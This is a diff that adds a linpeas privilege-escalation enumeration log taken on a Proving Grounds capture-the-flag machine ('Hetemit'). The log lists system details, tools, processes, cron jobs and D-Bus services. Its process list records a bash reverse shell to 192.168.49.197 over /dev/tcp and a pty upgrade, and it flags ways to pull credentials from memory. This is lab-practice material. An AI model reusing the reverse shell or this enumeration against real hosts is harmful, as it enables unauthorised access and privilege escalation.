@@ -1,0 +1,1660 @@
+root@kali:~/CTF/PGPractice/Hetemit/PE# cat linpeas.txt
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v3.2.0 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 4.18.0-193.28.1.el8_2.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.3.1 20191121 (Red Hat 8.3.1-5) (GCC)) #1 SMP Thu Oct 22 00:20:22 UTC 2020
+User & Groups: uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
+Hostname: hetemit
+Writable folder: /dev/shm
+[+] /usr/sbin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories using 2 threads DONE
+
+════════════════════════════════════╣ System Information ╠════════════════════════════════════
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 4.18.0-193.28.1.el8_2.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.3.1 20191121 (Red Hat 8.3.1-5) (GCC)) #1 SMP Thu Oct 22 00:20:22 UTC 2020
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.29
+
+[+] USBCreator
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/home/cmeeks/.local/bin:/home/cmeeks/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin
+New path exported: /home/cmeeks/.local/bin:/home/cmeeks/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin:/sbin:/bin
+
+[+] Date
+Sat Jun 12 05:53:38 UTC 2021
+
+[+] System stats
+Filesystem           Size  Used Avail Use% Mounted on
+devtmpfs             1.9G     0  1.9G   0% /dev
+tmpfs                1.9G  8.0K  1.9G   1% /dev/shm
+tmpfs                1.9G  174M  1.7G  10% /run
+tmpfs                1.9G     0  1.9G   0% /sys/fs/cgroup
+/dev/mapper/cl-root  7.5G  3.3G  4.2G  44% /
+/dev/sda2            976M  178M  731M  20% /boot
+/dev/sda1            599M  6.9M  592M   2% /boot/efi
+              total        used        free      shared  buff/cache   available
+Mem:        3868304     1334336     1123604      191452     1410364     2053488
+Swap:       1048572           0     1048572
+
+[+] CPU info
+Architecture:        x86_64
+CPU op-mode(s):      32-bit, 64-bit
+Byte Order:          Little Endian
+CPU(s):              2
+On-line CPU(s) list: 0,1
+Thread(s) per core:  1
+Core(s) per socket:  1
+Socket(s):           2
+NUMA node(s):        1
+Vendor ID:           AuthenticAMD
+CPU family:          23
+Model:               1
+Model name:          AMD EPYC 7371 16-Core Processor
+Stepping:            2
+CPU MHz:             3094.187
+BogoMIPS:            6188.37
+Hypervisor vendor:   VMware
+Virtualization type: full
+L1d cache:           32K
+L1i cache:           64K
+L2 cache:            512K
+L3 cache:            65536K
+NUMA node0 CPU(s):   0,1
+Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
+
+[+] Environment
+[i] Any private information inside environment variables?
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+LANG=en_US.UTF-8
+rvm_bin_path=/home/cmeeks/.rvm/bin
+OLDPWD=/home/cmeeks
+INVOCATION_ID=fdbf62f76d294eaf92e28df51578c6b1
+rvm_version=1.29.10 (latest)
+RUBY_VERSION=ruby-2.6.3
+GEM_HOME=/home/cmeeks/.rvm/gems/ruby-2.6.3
+USER=cmeeks
+PWD=/home/cmeeks/tmp
+HOME=/home/cmeeks
+JOURNAL_STREAM=9:24458
+HISTFILE=/dev/null
+GEM_PATH=/home/cmeeks/.rvm/gems/ruby-2.6.3:/home/cmeeks/.rvm/gems/ruby-2.6.3@global
+rvm_path=/home/cmeeks/.rvm
+SHELL=bash
+TERM=xterm
+LS_OPTIONS=--color=auto
+rvm_prefix=/home/cmeeks
+SHLVL=5
+LOGNAME=cmeeks
+MY_RUBY_HOME=/home/cmeeks/.rvm/rubies/ruby-2.6.3
+PATH=/home/cmeeks/.local/bin:/home/cmeeks/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin:/sbin:/bin
+HISTSIZE=0
+IRBRC=/home/cmeeks/.rvm/rubies/ruby-2.6.3/.irbrc
+HISTFILESIZE=0
+FLASK_RUN_FROM_CLI=true
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+_=/usr/bin/env
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+ Not Found
+
+[+] AppArmor enabled? .............. AppArmor Not Found
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... SELinux status:                 disabled
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a virtual machine? ..... Yes (vmware)
+
+═════════════════════════════════════════╣ Containers ╠══════════════════════════════════════════
+[+] Is this a container? ........... No
+
+[+] Container related tools present
+[+] Any running containers? ........ No
+
+═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda3
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+
+/dev/mapper/cl-root     /                       xfs     defaults        0 0
+UUID=06468e39-fda9-4019-8d4d-1ab736e83c93 /boot                   ext4    defaults        1 2
+UUID=7F98-0297          /boot/efi               vfat    umask=0077,shortname=winnt 0 2
+/dev/mapper/cl-swap     swap                    swap    defaults        0 0
+
+
+════════════════════════════════════╣ Available Software ╠════════════════════════════════════
+[+] Useful software
+/usr/bin/nc
+/usr/bin/ncat
+/usr/bin/wget
+/usr/bin/curl
+/usr/sbin/ping
+/usr/bin/gcc
+/usr/bin/g++
+/usr/bin/make
+/usr/bin/base64
+/usr/bin/socat
+/usr/bin/python3
+/usr/bin/python3.6
+/usr/bin/perl
+/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin/ruby
+/usr/bin/sudo
+
+[+] Installed Compiler
+gcc.x86_64                        8.3.1-5.el8.0.2                     @AppStream
+gcc-c++.x86_64                    8.3.1-5.el8.0.2                     @AppStream
+/usr/bin/gcc
+/usr/bin/g++
+
+
+══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+root           1  0.0  0.2 176740 10784 ?        Ss   01:32   0:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 16
+root         713  1.2  0.4 111120 15768 ?        Ss   01:32   3:11 /usr/lib/systemd/systemd-journald
+root         748  0.0  0.2 108620  9916 ?        Ss   01:32   0:00 /usr/lib/systemd/systemd-udevd
+root         858  0.0  0.0  75632  1876 ?        S<sl 01:32   0:00 /sbin/auditd
+polkitd      880  0.0  0.5 1625940 21772 ?       Ssl  01:32   0:00 /usr/lib/polkit-1/polkitd --no-debug
+dbus         881  0.0  0.1  56316  5368 ?        Ss   01:32   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root         882  0.0  0.2 294924 11296 ?        Ss   01:32   0:00 /usr/bin/VGAuthService -s
+root         883  0.0  0.4 594756 19312 ?        Ssl  01:32   0:07 /usr/bin/vmtoolsd
+libstor+     884  0.0  0.0  18872  1952 ?        Ss   01:32   0:00 /usr/bin/lsmd -d
+root         889  0.0  0.1 124804  5404 ?        Ssl  01:32   0:00 /usr/sbin/irqbalance --foreground
+root         892  0.0  0.3 422208 14144 ?        Ss   01:32   0:00 /usr/sbin/sssd -i --logger=files
+root         988  0.0  0.3 428752 14572 ?        S    01:32   0:00  _ /usr/libexec/sssd/sssd_be --domain implicit_files --uid 0 --gid 0 --logger=files
+root        1005  0.0  0.9 431112 38096 ?        S    01:32   0:00  _ /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
+root         894  0.0  0.1  26368  4848 ?        Ss   01:32   0:00 /usr/sbin/smartd -n -q never
+root         895  0.0  0.4 591956 18156 ?        Ssl  01:32   0:00 /usr/sbin/NetworkManager --no-daemon[0m
+rngd         897  0.0  0.1 233964  6668 ?        Ssl  01:32   0:10 /sbin/rngd -f --fill-watermark=0
+  └─(Caps) 0x0000000000200000=cap_sys_admin
+root         939  0.0  0.8 635044 31288 ?        Ssl  01:32   0:01 /usr/libexec/platform-python -Es /usr/sbin/tuned -l -P
+root         942  0.0  0.2 281412 11552 ?        Ss   01:32   0:00 /usr/sbin/httpd -DFOREGROUND
+apache      1029  0.0  0.2 294148  8448 ?        S    01:32   0:00  _ /usr/sbin/httpd -DFOREGROUND
+apache      1030  0.4  0.5 1810780 20036 ?       Sl   01:32   1:12  _ /usr/sbin/httpd -DFOREGROUND
+apache      1031  0.4  0.4 1810780 15924 ?       Sl   01:32   1:12  _ /usr/sbin/httpd -DFOREGROUND
+apache      1032  0.4  0.4 1941908 17776 ?       Sl   01:32   1:12  _ /usr/sbin/httpd -DFOREGROUND
+apache      2251  0.5  0.5 1810836 20728 ?       Sl   01:50   1:14  _ /usr/sbin/httpd -DFOREGROUND
+root         948  0.0  0.2  95088  7808 ?        Ss   01:32   0:00 /usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc -oMACs=hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 -oGSSAPIKexAlgorithms=gss-gex-sha1-,gss-group14-sha1- -oKexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oPubkeyAcceptedKeyTypes=rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com -oCASignatureAlgorithms=rsa-sha2-256,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,rsa-sha2-512,ecdsa-sha2-nistp521,ssh-ed25519,ssh-rsa
+root         960  0.0  0.0  27016  1268 ?        Ss   01:32   0:01 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
+postgres     970  0.0  0.5 455372 21656 ?        Ss   01:32   0:00 /usr/bin/postmaster -D /var/lib/pgsql/data
+postgres    1006  0.0  0.0 310296  2540 ?        Ss   01:32   0:00  _ postgres: logger process
+postgres    1022  0.0  0.1 455472  4944 ?        Ss   01:32   0:00  _ postgres: checkpointer process
+postgres    1023  0.0  0.0 455372  3416 ?        Ss   01:32   0:00  _ postgres: writer process
+postgres    1024  0.0  0.2 455372  8256 ?        Ss   01:32   0:00  _ postgres: wal writer process
+postgres    1025  0.0  0.1 455784  6236 ?        Ss   01:32   0:00  _ postgres: autovacuum launcher process
+postgres    1026  0.0  0.0 310432  2544 ?        Ss   01:32   0:00  _ postgres: stats collector process
+postgres    1027  0.0  0.1 455664  4224 ?        Ss   01:32   0:00  _ postgres: bgworker: logical replication launcher
+root        1008  0.0  0.1  83792  7632 ?        Ss   01:32   0:00 /usr/lib/systemd/systemd-logind
+root        1011  0.0  0.0 225792  1720 tty1     Ss+  01:32   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
+root        1013  0.0  0.0  42624  2500 ?        Ss   01:32   0:00 /usr/sbin/atd -f
+root        1014  0.0  0.0 245852  3768 ?        Ss   01:32   0:00 /usr/sbin/crond -n
+root        1399  0.0  0.6 405764 23296 ?        Ss   01:32   0:00 /usr/sbin/smbd --foreground --no-process-group
+root        1648  0.0  0.1 380548  6040 ?        S    01:32   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+root        1649  0.0  0.1 380556  6108 ?        S    01:32   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+root        1683  0.0  0.3 405748 12364 ?        S    01:32   0:00  _ /usr/sbin/smbd --foreground --no-process-group
+cmeeks      1400 15.0  0.9 1377880 36408 ?       Ssl  01:32  39:20 /usr/bin/python3.6 /usr/local/bin/flask run -h 0.0.0.0 -p 50000
+cmeeks   2123674  0.0  0.0 222488  3112 ?        S    05:46   0:00  _ bash -c bash -i >& /dev/tcp/192.168.49.197/18000 0>&1
+cmeeks   2123676  0.0  0.2 237420  8500 ?        S    05:46   0:00      _ bash -i
+cmeeks   2170954  0.0  0.2 254612  9612 ?        S    05:50   0:00          _ python3 -c import pty; pty.spawn("/bin/bash")
+cmeeks   2170955  0.0  0.2 237796  8904 pts/0    Ss   05:50   0:00              _ /bin/bash
+cmeeks   2171077  0.4  0.1 224320  4924 pts/0    S+   05:53   0:00                  _ /bin/sh ./linpeas.sh -a
+cmeeks   2171755  0.0  0.0 224320  3572 pts/0    S+   05:53   0:00                  |   _ /bin/sh ./linpeas.sh -a
+cmeeks   2171758  0.0  0.1 267768  4120 pts/0    R+   05:53   0:00                  |   |   _ ps fauxwww
+cmeeks   2171759  0.0  0.0 224320  2052 pts/0    S+   05:53   0:00                  |   _ /bin/sh ./linpeas.sh -a
+cmeeks   2171078  0.0  0.0 217048   800 pts/0    S+   05:53   0:00                  _ tee linpeas.txt
+systemd+    1928  0.0  0.2 112780  9024 ?        Ss   01:34   0:00 /usr/lib/systemd/systemd-resolved
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x. 1 root root 1219248 Nov  8  2019 /bin/bash
+lrwxrwxrwx. 1 root root       4 Nov  8  2019 /bin/sh -> bash
+-rwxr-xr-x. 1 root root   64056 Apr 24  2020 /sbin/agetty
+-rwxr-xr-x. 1 root root  151488 Apr 24  2020 /sbin/auditd
+-rwxr-xr-x. 1 root root   65560 Apr 24  2020 /sbin/rngd
+-rwxr-xr-x. 1 root root  245640 Jul 21  2020 /usr/bin/dbus-daemon
+-rwxr-xr-x. 1 root root   25320 Apr 24  2020 /usr/bin/lsmd
+lrwxrwxrwx  1 root root       8 Sep 15  2020 /usr/bin/postmaster -> postgres
+lrwxrwxrwx  1 root root      31 Nov 20  2019 /usr/bin/python3.6 -> /usr/libexec/platform-python3.6
+-rwxr-xr-x. 1 root root  142456 Aug  6  2020 /usr/bin/VGAuthService
+-rwxr-xr-x. 1 root root   62912 Aug  6  2020 /usr/bin/vmtoolsd
+lrwxrwxrwx. 1 root root      20 Apr 16  2020 /usr/libexec/platform-python -> ./platform-python3.6
+-rwxr-xr-x. 1 root root  238024 Apr 24  2020 /usr/libexec/sssd/sssd_be
+-rwxr-xr-x. 1 root root  289024 Apr 24  2020 /usr/libexec/sssd/sssd_nss
+-rwxr-xr-x. 1 root root  167864 Apr  9  2020 /usr/lib/polkit-1/polkitd
+-rwxr-xr-x. 1 root root 1559656 Jul 21  2020 /usr/lib/systemd/systemd
+-rwxr-xr-x. 1 root root  153896 Jul 21  2020 /usr/lib/systemd/systemd-journald
+-rwxr-xr-x. 1 root root  250952 Jul 21  2020 /usr/lib/systemd/systemd-logind
+-rwxr-xr-x. 1 root root  455600 Jul 21  2020 /usr/lib/systemd/systemd-resolved
+-rwxr-xr-x. 1 root root  418112 Jul 21  2020 /usr/lib/systemd/systemd-udevd
+-rwxr-xr-x. 1 root root   34472 May 11  2019 /usr/sbin/atd
+-rwxr-xr-x. 1 root root   80552 Nov  8  2019 /usr/sbin/crond
+-rwxr-xr-x  1 root root  580056 Sep 15  2020 /usr/sbin/httpd
+-rwxr-xr-x. 1 root root   86552 Dec 13  2019 /usr/sbin/irqbalance
+-rwxr-xr-x. 1 root root 3301160 Jul 21  2020 /usr/sbin/NetworkManager
+-rwxr-xr-x. 1 root root  717080 May 11  2019 /usr/sbin/smartd
+-rwxr-xr-x  1 root root   91944 Apr 24  2020 /usr/sbin/smbd
+-rwxr-xr-x. 1 root root 1228192 Feb  4  2020 /usr/sbin/sshd
+-rwxr-xr-x. 1 root root   87824 Apr 24  2020 /usr/sbin/sssd
+-rwxr-xr-x  1 root root  177008 Apr 24  2020 /usr/sbin/vsftpd
+
+[+] Files opened by processes belonging to other users
+[i] This is usually empty because of the lack of privileges to read other user processes information
+COMMAND       PID     TID TASKCMD              USER   FD      TYPE             DEVICE  SIZE/OFF     NODE NAME
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd process found (dump creds from memory as root)
+apache2 Not Found
+sshd Not Found
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+/usr/bin/crontab
+incrontab Not Found
+-rw-r--r--. 1 root root   0 Nov  8  2019 /etc/cron.deny
+-rw-r--r--. 1 root root 451 May 11  2019 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x.  2 root root   39 Nov 13  2020 .
+drwxr-xr-x. 87 root root 8192 Jun 12 01:34 ..
+-rw-r--r--.  1 root root  128 Nov  8  2019 0hourly
+-rw-r--r--.  1 root root  108 Apr 24  2020 raid-check
+
+/etc/cron.daily:
+total 16
+drwxr-xr-x.  2 root root   23 Nov 13  2020 .
+drwxr-xr-x. 87 root root 8192 Jun 12 01:34 ..
+-rwxr-xr-x.  1 root root  189 Jan  4  2018 logrotate
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.  2 root root   22 Nov 13  2020 .
+drwxr-xr-x. 87 root root 8192 Jun 12 01:34 ..
+-rwxr-xr-x.  1 root root  575 Nov  8  2019 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.  2 root root    6 May 11  2019 .
+drwxr-xr-x. 87 root root 8192 Jun 12 01:34 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.  2 root root    6 May 11  2019 .
+drwxr-xr-x. 87 root root 8192 Jun 12 01:34 ..
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+
+
+
+
+
+SHELL=/bin/sh
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+RANDOM_DELAY=45
+START_HOURS_RANGE=3-22
+
+1       5       cron.daily              nice run-parts /etc/cron.daily
+7       25      cron.weekly             nice run-parts /etc/cron.weekly
+@monthly 45     cron.monthly            nice run-parts /etc/cron.monthly
+
+[+] Services
+[i] Search for outdated versions
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+/lib/systemd/system/sssd-kcm.service is executing some relative path
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES
+Sat 2021-06-12 06:42:32 UTC  47min left Sat 2021-06-12 05:42:32 UTC  12min ago    dnf-makecache.timer          dnf-makecache.service
+Sun 2021-06-13 00:00:00 UTC  18h left   Sat 2021-06-12 01:34:45 UTC  4h 20min ago unbound-anchor.timer         unbound-anchor.service
+Sun 2021-06-13 01:47:17 UTC  19h left   Sat 2021-06-12 01:47:17 UTC  4h 7min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.PolicyKit1.conf (  <policy user="polkitd">
+  <policy user="polkitd">)
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+NAME                                  PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
+:1.1                                    1 systemd         root             :1.1          init.scope                -          -
+:1.112                            2182055 busctl          cmeeks           :1.112        pythonapp.service         -          -
+:1.12                                 895 NetworkManager  root             :1.12         NetworkManager.service    -          -
+:1.18                                1008 systemd-logind  root             :1.18         systemd-logind.service    -          -
+:1.19                                 939 tuned           root             :1.19         tuned.service             -          -
+:1.24                                1399 smbd            root             :1.24         smb.service               -          -
+:1.4                                  880 polkitd         polkitd          :1.4          polkit.service            -          -
